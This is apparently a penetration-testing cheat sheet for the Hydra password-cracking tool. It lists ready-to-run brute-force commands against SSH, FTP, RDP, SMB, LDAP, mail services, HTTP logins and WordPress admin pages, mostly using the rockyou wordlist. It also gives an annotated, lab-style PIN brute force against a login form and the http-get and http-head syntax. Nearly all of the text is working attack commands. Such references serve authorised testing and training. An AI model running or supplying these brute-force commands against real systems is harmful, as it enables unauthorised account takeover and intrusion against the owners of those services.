Command         Description  
hydra -P password-file.txt -v $ip snmp  Hydra brute force against SNMP  
hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp     Hydra FTP known user and rockyou password list  
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh    Hydra SSH using list of users and passwords  
hydra -v -V -u -L users.txt -p "" -t 1 -u $ip ssh       Hydra SSH using a known password and a username list  
hydra $ip -s 22 ssh -l -P big_wordlist.txt      Hydra SSH Against Known username on port 22  
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V        Hydra POP3 Brute Force  
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V       Hydra SMTP Brute Force  
hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin       Hydra attack http get 401 login with a dictionary  
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip         Hydra attack Windows Remote Desktop with rockyou  
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb   Hydra brute force SMB user with rockyou:  
hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'         Hydra brute force a Wordpress admin login  
hydra -L usernames.txt -P passwords.txt $ip smb -V -f   SMB Brute Forcing  
hydra -L users.txt -P passwords.txt $ip ldap2 -V -f     LDAP Brute Forcing  


---------------------------------------------------------------------------------  

hydra -l '' -P 3digits.txt -f -v 10.10.50.172 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000  

The command above will try one password after another in the 3digits.txt file. It specifies the following:  
    -l '' indicates that the login name is blank as the security lock only requires a password
    -P 3digits.txt specifies the password file to use
    -f stops Hydra after finding a working password
    -v provides verbose output and is helpful for catching errors
    10.10.50.172 is the IP address of the target
    http-post-form specifies the HTTP method to use
    "/login.php:pin=^PASS^:Access denied" has three parts separated by :
        /login.php is the page where the PIN code is submitted
        pin=^PASS^ will replace ^PASS^ with values from the password list
        Access denied indicates that invalid passwords will lead to a page that contains the text “Access denied”
    -s 8000 indicates the port number on the target

---------------------------------------------------------------------------------  

`hydra -l username -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-head /`

SYNTAX :
#http-get  
`hydra -l username -P <wordlist> -f <ip> http-get /`

#http-head  
`hydra -l username -P <wordlist> -f <ip> http-head /`

http-head:  

This specifies the protocol and method to be used. http-head tells Hydra to use the HTTP HEAD method for the attack. The HEAD method is similar to GET, but it only retrieves the headers, not the full content. This can be useful for checking authentication without downloading large amounts of data.
